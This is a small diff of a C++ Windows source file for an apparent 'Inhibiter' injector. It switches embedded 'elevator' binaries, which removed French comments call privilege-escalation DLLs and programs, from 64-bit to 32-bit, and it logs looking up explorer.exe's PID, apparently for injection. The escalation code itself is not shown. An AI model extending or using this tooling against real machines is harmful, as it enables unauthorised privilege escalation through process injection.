@@ -1,16 +1,10 @@
-//!
-//!     Kaleidoscalp, all rights reserved.
-//!
-
 #include <windows.h>
 #include <string>
 #include <cstdlib>
 
-// DLL de privilege escalation
-#include <ElevatorDll.hpp>
+#include <ElevatorDll32.hpp>
 #include <ElevatorDll64.hpp>
-// Programme de privilege escalation
-#include <Elevator.hpp>
+#include <Elevator32.hpp>
 #include <Elevator64.hpp>
 
 #include "Inhibiter.hpp"
@@ -140,7 +134,6 @@ void ExecuteCommand(InhibiterCore& injector, const string& command)
     }
 }
 
-
 void Inject(InhibiterCore& injector, const string& inhibitorPath)
 {
     FUNC_LOG(__FUNCTION__);
@@ -177,8 +170,8 @@ void Inject(InhibiterCore& injector, const string& inhibitorPath)
 					}
 					else
 					{
-						elevatorDll = new BinaryRessource(ElevatorDll64, sizeof(ElevatorDll64), ELEVATOR_DLL_NAME, true);
-						elevator = new BinaryRessource(Elevator64, sizeof(Elevator64), ELEVATOR_EXE_NAME, true);
+						elevatorDll = new BinaryRessource(ElevatorDll32, sizeof(ElevatorDll32), ELEVATOR_DLL_NAME, true);
+						elevator = new BinaryRessource(Elevator32, sizeof(Elevator32), ELEVATOR_EXE_NAME, true);
 					}
 
 					LOG << "Decouverte du PID d'explorer.exe";
@@ -203,7 +196,6 @@ void Inject(InhibiterCore& injector, const string& inhibitorPath)
 			}
 		default:
 			LOG << "Vous etes administrateur!";
-			
 	}
 
 	if(injector.installed())
